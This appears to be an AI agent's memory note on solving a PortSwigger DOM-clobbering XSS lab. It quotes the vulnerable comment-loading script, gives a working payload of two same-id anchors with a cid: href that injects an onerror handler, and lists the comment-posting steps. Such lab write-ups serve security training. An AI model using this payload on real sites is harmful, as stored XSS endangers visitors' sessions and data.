---
metadata:
  node_type: memory
name: "DOM Clobbering XSS Lab Solve A-arm"
description: "Solved the DOM-clobbering XSS lab: clobber window.defaultAvatar with two same-id anchors + cid: href, filler comment after, alert fired + banner solved."
last_updated: 2026-10-10T06:05:21+08:00
created: 2026-10-10T06:05:21+08:00
---

Lab: PortSwigger /web-security/dom-based/dom-clobbering/lab-dom-xss-exploiting-dom-clobbering (widget lab id 992c042f1d4d37ec3fc36d4dd46f47d9769928fd769e125ae22c02fbf99177b4).
Verdict: solved (banner "Congratulations, you solved the lab!"), page_alert fired alert:1.

Vulnerable JS /resources/js/loadCommentsWithDomClobbering.js:
  let defaultAvatar = window.defaultAvatar || {avatar: '/resources/images/avatarDefault.svg'}
  '<img class="avatar" src="' + (comment.avatar ? escapeHTML(comment.avatar) : defaultAvatar.avatar) + '">'
  divImgContainer.innerHTML = avatarImgHTML   -- raw sink, no DOMPurify on this string
comment.avatar is "" for form posts, so the defaultAvatar path is taken; window.defaultAvatar is clobberable by DOM ids.

Clobber: two anchors with the same id -> window.defaultAvatar is an HTMLCollection; named access .avatar
returns the element with name="avatar"; string coercion of an a-element yields its href.
Payload as comment body, stored verbatim; DOMPurify 2.0.15 keeps id/name and allows the cid: URI:
  <a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">
Rendered string becomes <img class="avatar" src="cid:"onerror=alert(1)//"> -> onerror fires.

Ordering matters: the anchors enter the DOM only when that comment's body is appended, so the clobber
must be followed by a later comment in the JSON array (posts are oldest-first). Steps:
1. GET /post?postId=1, lift name="csrf" value.
2. POST /post/comment with csrf, postId, comment=payload, name, email, website -> 302.
3. POST a second filler comment so a later comment's avatar reads the clobbered global.
4. page_alert /post?postId=1 -> alerts [alert:1], fired=true.
5. banner_verdict -> solved true.

